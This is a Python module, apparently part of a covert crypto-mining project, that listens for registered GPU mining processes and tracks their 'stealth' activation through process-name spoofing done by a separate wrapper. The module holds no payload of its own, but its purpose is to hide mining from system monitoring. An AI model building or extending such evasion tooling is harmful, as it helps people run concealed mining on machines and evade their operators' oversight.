#!/usr/bin/env python3
"""mining_environment.stealth.core.stealth_activation_manager

🔄 **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)

Centralized stealth activation system với **[DirectPIDRegistry Integration]** (tích hợp DirectPIDRegistry).
Tách biệt hoàn toàn logic STEALTH khỏi **gpu_mining** và **mining processes**.

⚠️ WORKFLOW:
1. **DirectPIDRegistry Observer**: Quan sát process registration events  
2. **Process Identification**: Xác định loại process (GPU) và PID  
3. **Stealth Strategy Selection**: Chọn chiến lược stealth phù hợp
4. **External + Self-Stealth**: Kết hợp cả external disguise và self-stealth
5. **Monitoring & Recovery**: Giám sát và tự động recovery khi cần

✅ FEATURES:
- DirectPIDRegistry-driven stealth activation (replaces EventBus)
- Support GPU processes only  
- Fallback strategies when external stealth fails
- Centralized logging & monitoring
- Zero impact on mining performance
"""

import os
import sys
import time
import logging
import threading
from typing import Dict, Any, Optional, Callable, List
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)


class StealthActivationManager:
    """
    **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)
    
    Centralized system để kích hoạt **[Process Name Spoofing]** (giả mạo tên tiến trình)
    cho mining processes thông qua **[DirectPIDRegistry Integration]** (tích hợp DirectPIDRegistry).
    """
    
    def __init__(self, logger: Optional[logging.Logger] = None):
        """
        Initialize Stealth Activation Manager với DirectPIDRegistry integration.
        
        Args:
            logger: Optional logger instance
        """
        self.logger = logger or get_unified_logger('mining_environment.stealth_activation')
        
        # DirectPIDRegistry observer setup
        self.direct_registry = None
        self.registry_observer_active = False
        
        # Process tracking
        self.active_stealth_processes: Dict[int, Dict[str, Any]] = {}
        self.stealth_lock = threading.RLock()
        
        # Stealth strategies (simplified - external stealth handled by wrappers)
        self.stealth_strategies = {
            'gpu': self._handle_gpu_stealth
        }
        
        self.logger.info("🔄 [STEALTH-ACTIVATION] Initialized with DirectPIDRegistry integration")
    
    def initialize(self) -> bool:
        """
        Initialize stealth activation system với DirectPIDRegistry observer.
        
        Returns:
            bool: True if initialization successful
        """
        try:
            self.logger.info("🚀 [STEALTH-ACTIVATION] Initializing stealth activation system...")
            
            # **Step 1**: Setup DirectPIDRegistry observer
            self._setup_direct_registry_observer()
            
            # **Step 2**: Initialize stealth strategies
            self._initialize_stealth_strategies()
            
            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation system initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Initialization failed: {e}")
            return False
    
    def _setup_direct_registry_observer(self):
        """Setup DirectPIDRegistry observer for process registration events."""
        try:
            self.logger.info("🔌 [STEALTH-ACTIVATION] Setting up DirectPIDRegistry observer...")
            
            # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
            try:
                from pid_logger.direct_registry import get_direct_registry
                self.direct_registry = get_direct_registry()
                
                # **Register observer** (đăng ký observer)
                success = self.direct_registry.register_observer(self._on_process_registered)
                
                if success:
                    self.registry_observer_active = True
                    self.logger.info("✅ [STEALTH-ACTIVATION] DirectPIDRegistry observer registered successfully")
                else:
                    self.logger.error("❌ [STEALTH-ACTIVATION] Failed to register DirectPIDRegistry observer")
                    
            except ImportError as import_err:
                self.logger.error(f"❌ [STEALTH-ACTIVATION] DirectPIDRegistry import failed: {import_err}")
                self.direct_registry = None
                
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] DirectPIDRegistry observer setup error: {e}")
    
    def _on_process_registered(self, process_info) -> None:
        """
        **[DirectPIDRegistry Observer Callback]** (callback quan sát DirectPIDRegistry)
        
        Được gọi khi DirectPIDRegistry nhận được process registration event.
        
        Args:
            process_info: ProcessInfo object từ DirectPIDRegistry
        """
        try:
            pid = process_info.pid
            process_type = process_info.process_type
            process_name = process_info.process_name
            metadata = process_info.metadata or {}
            
            self.logger.info(f"🔔 [STEALTH-ACTIVATION] Process registered: PID={pid}, Type={process_type}, Name={process_name}")
            
            # **Filter GPU processes only** (chỉ xử lý GPU processes)
            if process_type == "gpu":
                # **Get process role** (lấy role của process)
                role = metadata.get('role', 'real')
                stealth_enabled = metadata.get('stealth_enabled', False)
                
                if role == 'real' and stealth_enabled:
                    self.logger.info(f"🎯 [STEALTH-ACTIVATION] Activating stealth for real GPU process: PID={pid}")
                    self._activate_process_stealth(pid, process_type, process_info)
                else:
                    self.logger.debug(f"🚫 [STEALTH-ACTIVATION] Skipping stealth for wrapper/non-stealth process: PID={pid}, Role={role}")
            else:
                self.logger.debug(f"🚫 [STEALTH-ACTIVATION] Ignoring non-GPU process: PID={pid}, Type={process_type}")
                
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Process registration handler error: {e}")
    
    def _activate_process_stealth(self, pid: int, process_type: str, process_info) -> None:
        """
        **[Process Stealth Activation]** (kích hoạt stealth cho process)
        
        Args:
            pid: Process ID
            process_type: Type of process ('gpu')
            process_info: ProcessInfo object from DirectPIDRegistry
        """
        try:
            with self.stealth_lock:
                # **Check if already active** (kiểm tra đã kích hoạt chưa)
                if pid in self.active_stealth_processes:
                    self.logger.info(f"⚠️ [STEALTH-ACTIVATION] Stealth already active for PID={pid}")
                    return
                
                # **Track stealth activation** (theo dõi kích hoạt stealth)
                stealth_data = {
                    'pid': pid,
                    'process_type': process_type,
                    'process_name': process_info.process_name,
                    'activation_time': time.time(),
                    'stealth_strategy': process_type,
                    'status': 'activating'
                }
                
                self.active_stealth_processes[pid] = stealth_data
                
                # **Apply stealth strategy** (áp dụng chiến lược stealth)
                strategy_func = self.stealth_strategies.get(process_type)
                if strategy_func:
                    strategy_func(process_info, stealth_data)
                    stealth_data['status'] = 'active'
                    self.logger.info(f"✅ [STEALTH-ACTIVATION] Stealth activated for PID={pid}")
                else:
                    stealth_data['status'] = 'failed'
                    self.logger.error(f"❌ [STEALTH-ACTIVATION] No stealth strategy for process type: {process_type}")
                    
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Stealth activation failed for PID={pid}: {e}")
    
    def _handle_gpu_stealth(self, process_info, stealth_data: Dict[str, Any]) -> None:
        """
        **[GPU Stealth Handler]** (xử lý stealth GPU)
        
        GPU stealth được xử lý bởi stealth wrapper, không cần external intervention.
        """
        try:
            pid = process_info.pid
            self.logger.info(f"🎮 [GPU-STEALTH] GPU process stealth handled internally by wrapper: PID={pid}")
            
            # **External stealth đã được xử lý bởi stealth_inference_cuda.py**
            # Chỉ cần log và track trạng thái
            
            stealth_data.update({
                'external_stealth': 'wrapper_handled',
                'stealth_method': 'process_name_spoofing',
                'stealth_wrapper': 'stealth_inference_cuda.py'
            })
            
        except Exception as e:
            self.logger.error(f"❌ [GPU-STEALTH] GPU stealth handling failed: {e}")
    
    def _initialize_stealth_strategies(self) -> None:
        """Initialize available stealth strategies."""
        try:
            self.logger.info("🔧 [STEALTH-ACTIVATION] Initializing stealth strategies...")
            
            # **Simplified strategies** (chiến lược đơn giản)
            # External stealth được xử lý bởi wrappers, chỉ cần tracking
            
            available_strategies = list(self.stealth_strategies.keys())
            self.logger.info(f"✅ [STEALTH-ACTIVATION] Initialized {len(available_strategies)} stealth strategies: {available_strategies}")
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Strategy initialization failed: {e}")
    
    def get_stealth_status(self) -> Dict[str, Any]:
        """
        Get current stealth status for all processes.
        
        Returns:
            Dict containing stealth status information
        """
        try:
            with self.stealth_lock:
                return {
                    'active_processes': len(self.active_stealth_processes),
                    'registry_observer_active': self.registry_observer_active,
                    'processes': dict(self.active_stealth_processes)
                }
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Status retrieval failed: {e}")
            return {'error': str(e)}
    
    def cleanup(self) -> None:
        """Cleanup stealth activation manager."""
        try:
            self.logger.info("🧹 [STEALTH-ACTIVATION] Cleaning up stealth activation manager...")
            
            # **Unregister DirectPIDRegistry observer** (hủy đăng ký observer)
            if self.direct_registry and self.registry_observer_active:
                # DirectPIDRegistry cleanup tự động khi process kết thúc
                self.registry_observer_active = False
            
            # **Clear active processes** (xóa active processes)
            with self.stealth_lock:
                self.active_stealth_processes.clear()
            
            self.logger.info("✅ [STEALTH-ACTIVATION] Cleanup completed")
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Cleanup failed: {e}")


# ✅ GLOBAL MANAGER INSTANCE
_stealth_activation_manager: Optional[StealthActivationManager] = None
_manager_lock = threading.RLock()


def get_stealth_activation_manager() -> StealthActivationManager:
    """
    Get or create global stealth activation manager instance.
    
    Returns:
        StealthActivationManager: Global manager instance
    """
    global _stealth_activation_manager
    
    with _manager_lock:
        if _stealth_activation_manager is None:
            _stealth_activation_manager = StealthActivationManager()
        return _stealth_activation_manager


def initialize_stealth_activation(legacy_event_bus=None) -> bool:
    """
    Initialize global stealth activation system.
    
    Args:
        legacy_event_bus: Legacy parameter for backward compatibility (ignored)
        
    Returns:
        bool: True if initialization successful
    """
    # **Ignore legacy EventBus parameter** (bỏ qua tham số EventBus cũ)
    manager = get_stealth_activation_manager()
    return manager.initialize()


def cleanup_stealth_activation() -> None:
    """Cleanup global stealth activation system."""
    global _stealth_activation_manager
    
    with _manager_lock:
        if _stealth_activation_manager:
            _stealth_activation_manager.cleanup()
            _stealth_activation_manager = None


if __name__ == "__main__":
    # **Test DirectPIDRegistry integration** (test tích hợp DirectPIDRegistry)
    logging.basicConfig(level=logging.INFO)
    
    print("🧪 Testing Stealth Activation Manager with DirectPIDRegistry...")
    
    success = initialize_stealth_activation()
    if success:
        print("✅ Stealth Activation Manager initialized successfully")
        
        manager = get_stealth_activation_manager()
        status = manager.get_stealth_status()
        print(f"📊 Status: {status}")
        
        cleanup_stealth_activation()
        print("🧹 Cleanup completed")
    else:
        print("❌ Stealth Activation Manager initialization failed")